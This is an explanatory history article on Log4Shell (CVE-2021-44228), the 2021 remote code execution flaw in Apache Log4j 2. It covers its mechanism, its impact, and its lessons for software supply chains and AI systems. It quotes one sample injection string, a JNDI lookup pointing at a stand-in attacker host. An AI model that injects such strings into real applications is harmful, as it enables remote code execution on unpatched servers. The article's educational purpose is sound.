---
title: "Log4Shell (CVE-2021-44228)"
description: "A critical 2021 remote code execution flaw in the Apache Log4j 2 logging library that exposed how deeply shared open-source code runs through global software."
date: 2026-06-23
categories: [History]
tags: ["security", "vulnerability", "java", "open-source", "log4j", "cve", "supply-chain"]
related:
  - explore/it-timeline
  - explore/galaxy
  - history/java
  - history/apache-httpd
  - history/solarwinds
faqs:
  - question: "What made Log4Shell so dangerous?"
    answer: "Log4j 2 is everywhere in the Java world, and the flaw needed no login. An attacker sent a crafted string that an application logged, and the server fetched and ran remote code. The combination of huge reach and trivial exploitation earned the maximum CVSS score of 10.0."
  - question: "Is Log4Shell still a threat in 2026?"
    answer: "Patched versions of Log4j 2 fix the flaw, and most maintained systems updated long ago. Risk remains on unpatched, forgotten, or embedded systems that nobody updates. The deeper lesson, about unknown dependencies, is still very much alive."
  - question: "Does Log4Shell affect AI systems?"
    answer: "AI systems run on the same software stacks as everything else. Many data pipelines, model-serving tools, and orchestration layers use Java and Log4j. Any input that reaches a logger, including a prompt or document, can carry an attack if the library is unpatched."
---

Log4Shell is a critical security flaw found in Apache Log4j 2, a logging library used by a vast number of Java applications. Reported to Apache in November 2021 and disclosed publicly on 9 December 2021, it let attackers run their own code on a server with nothing more than a carefully crafted text string. With a CVSS severity score of 10.0, the maximum possible, it became one of the most serious vulnerabilities in the history of computing.

<figure class="bz-figure"><img src="/img/shaping-ai/books-radial-red-sphere-notext.png" alt="Books arranged in a radial ring around a glowing red sphere, suggesting a shared core that everything else depends on, much like the Log4j library at the centre of countless applications." loading="lazy"><figcaption>Log4Shell showed how one small library can sit at the centre of millions of programs, so a single flaw radiates outward across the whole ecosystem.</figcaption></figure>

## What it was

Logging is the boring, essential act of writing down what a program does. Log4j 2 is one of the most popular tools for this in Java. Almost every web app records events like "user logged in" or "request failed" so engineers can debug problems later.

Log4j 2 had a feature called message lookups. When it logged a string containing a special pattern, it would expand that pattern into a real value. One pattern used JNDI, a Java directory service. A string like `${jndi:ldap://attacker.com/x}` told Log4j to contact a remote server and load whatever it returned.

The problem is that applications log untrusted input all the time. A username, a search box, a browser header, even a chat message can end up in a log line. An attacker put the malicious string anywhere the server might log it. Log4j then reached out to the attacker's server and executed the returned code.

Think of a hotel that writes every guest's name in a guestbook, then reads each entry aloud to a butler who obeys it. A guest signs in as "Fetch a package from this address and follow its orders." The hotel reads it aloud, and the butler complies. The guestbook was never meant to issue commands, but the system trusted it anyway.

<div class="bz-flow">
  <div class="bz-flow-step"><span class="bz-flow-step-tag">Step 1</span><span class="bz-flow-step-name">Inject string</span><span class="bz-flow-step-desc">Attacker sends a crafted value in a header, form field, or chat message.</span></div>
  <div class="bz-flow-arrow">→</div>
  <div class="bz-flow-step"><span class="bz-flow-step-tag">Step 2</span><span class="bz-flow-step-name">App logs it</span><span class="bz-flow-step-desc">The application records the value using Log4j 2, as normal.</span></div>
  <div class="bz-flow-arrow">→</div>
  <div class="bz-flow-step"><span class="bz-flow-step-tag">Step 3</span><span class="bz-flow-step-name">Lookup fires</span><span class="bz-flow-step-desc">Log4j sees the JNDI pattern and contacts the attacker's server.</span></div>
  <div class="bz-flow-arrow">→</div>
  <div class="bz-flow-step"><span class="bz-flow-step-tag">Step 4</span><span class="bz-flow-step-name">Code runs</span><span class="bz-flow-step-desc">The server loads and executes attacker-controlled code.</span></div>
</div>

## Why it mattered

Log4j 2 is open-source, free, and maintained by volunteers under the Apache Software Foundation. Its reach is enormous. It sits inside cloud platforms, enterprise products, games, network appliances, and developer tools. Many teams did not even know they were running it, because it arrived bundled deep inside other dependencies.

That invisibility was the real story. A single flaw in one volunteer-maintained library put a large share of the internet at risk at the same time. Security teams spent the December 2021 holiday period scanning systems, patching servers, and hunting for hidden copies of Log4j.

Government agencies treated it as a major event. The United States Cybersecurity and Infrastructure Security Agency ordered federal civilian agencies to patch quickly. Apache released a series of fixes through December 2021 as researchers found further weaknesses. Attackers scanned the internet within hours, planting cryptocurrency miners and backdoors.

Log4Shell also exposed a structural problem. Critical infrastructure leans on free software maintained by small, often unpaid teams. The incident accelerated investment in software supply-chain security.

## How it connects to AI today

Modern AI runs on ordinary software, and a lot of that software is Java. Big-data and machine-learning tooling like Apache Spark, Hadoop, Kafka, Flink, and Elasticsearch all live in the Java world, and many used Log4j. The pipelines that prepare training data, serve models, and orchestrate jobs share the same plumbing that Log4Shell attacked. AI did not get a separate, safer stack.

The deeper link is the supply chain. An AI application is a tower of dependencies: model libraries, vector databases, web frameworks, and the packages those pull in. A modern builder rarely audits every layer. Log4Shell is the textbook proof that one buried dependency can compromise everything above it. This is exactly why the Software Bill of Materials, a list of every component inside a product, became a standard requirement after 2021. AI products now ship with SBOMs too.

There is also a sharp lesson about untrusted input. Log4Shell weaponised data that flowed into a logger. The same shape of problem appears in AI as prompt injection, where a malicious instruction hides inside a document or message that a model then acts on. In both cases a system treats data as commands. A builder who connects an AI agent to tools or external content meets the Log4Shell pattern directly: never trust input to stay passive.

Where you meet it today is in CI scanners, dependency checks like Dependabot, and runtime tools that flag vulnerable libraries before code ships. Cloud provider security advisories still cite Log4Shell as a reference case for fast, coordinated patching.

## Still in use today

Log4Shell is a milestone, not a living product. The flaw itself is fixed. Apache Log4j 2 remains actively maintained, and current versions removed the dangerous lookup behaviour by default. Upgrading the library closes the hole, and most maintained systems patched it within weeks of disclosure.

The vulnerability persists only where software is forgotten. Embedded devices, abandoned servers, and old appliances that nobody updates can still carry a vulnerable Log4j. Security scanners keep finding it years later in such corners.

What truly endures is the lesson. Log4Shell reshaped how the industry thinks about open-source dependencies, supply-chain risk, and the duty to know what runs inside your software. That mindset now applies to every AI system as much as to any web app. The library was patched in days. The change in how engineers reason about trust and dependencies is permanent.

## Further reading

- [IT History Timeline](/explore/it-timeline/): where Log4Shell sits among the milestones of computing.
- [AI Learning Galaxy](/explore/galaxy/): explore connected topics across AI and software.
- [Java](/history/java/): the language and platform whose ubiquity gave Log4Shell its reach.
- [SolarWinds supply-chain attack](/history/solarwinds/): another landmark lesson in trusting software you did not write.
- [CVE-2021-44228 entry](https://nvd.nist.gov/vuln/detail/CVE-2021-44228): the official record in the US National Vulnerability Database, including the CVSS 10.0 score.
- [Apache Log4j Security Vulnerabilities page](https://logging.apache.org/log4j/2.x/security.html): the maintainers' own advisory and remediation guidance.
- [Log4Shell on Wikipedia](https://en.wikipedia.org/wiki/Log4Shell): a broad overview of the timeline, impact, and response.
